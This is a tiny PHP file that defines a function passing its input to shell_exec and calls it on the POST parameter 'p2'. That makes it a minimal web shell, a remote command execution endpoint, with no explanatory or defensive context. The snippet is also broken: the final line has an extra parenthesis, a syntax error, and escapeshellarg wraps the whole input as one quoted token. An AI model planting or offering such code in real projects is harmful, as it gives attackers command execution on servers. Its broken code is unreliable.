<?php
function ex($in) {
	$res = shell_exec($in);
	return $res;
}

ex(escapeshellarg($_POST['p2'])));
?>